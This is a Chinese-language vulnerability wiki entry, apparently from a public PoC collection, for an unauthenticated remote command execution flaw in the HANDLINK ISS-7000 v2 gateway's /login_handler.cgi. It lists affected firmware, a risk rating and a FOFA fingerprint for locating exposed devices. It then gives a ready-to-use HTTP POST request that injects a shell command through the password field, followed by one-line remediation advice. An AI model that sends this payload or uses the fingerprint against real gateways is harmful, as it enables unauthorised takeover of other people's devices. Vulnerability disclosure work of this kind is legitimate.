---
fofa: "icon_hash="
source: "SourByte05/Vulnerability-Wiki-PoC"
---

# HANDLINK ISS-7000v2 网关 login_handler.cgi 未授权RCE漏洞

# 漏洞描述

瀚霖科技股份有限公司ISS-7000 v2网络网关服务器 /login_handler.cgi接口存在远程命令执行漏洞，未经身份验证的远程攻击者可利用此漏洞执行任意系统命令，写入后门文件，获取服务器权限。

# 影响版本

ISS-7000 v2固件版本1.00.06 、1.00.08

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 已公开 | 已知 |

## 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

# 漏洞复现

FOFA：icon_hash="-842942564"

POC/EXP：

POST /login_handler.cgi HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 6.2) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/41.0.887.0 Safari/532.1
Content-Type: application/x-www-form-urlencoded
Connection: close

username=admin&password=admin|ifconfig&uilng=3&button=%E7%99%BB%E5%85%A5&Signin=

![image-20241108105834446](./.resource/HANDLINKISS-7000v2网关login_handler.cgi未授权RCE漏洞/media/image-20241108105834446.png)


# 修复方案

关闭互联网暴露面或接口设置访问权限

升级至安全版本


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
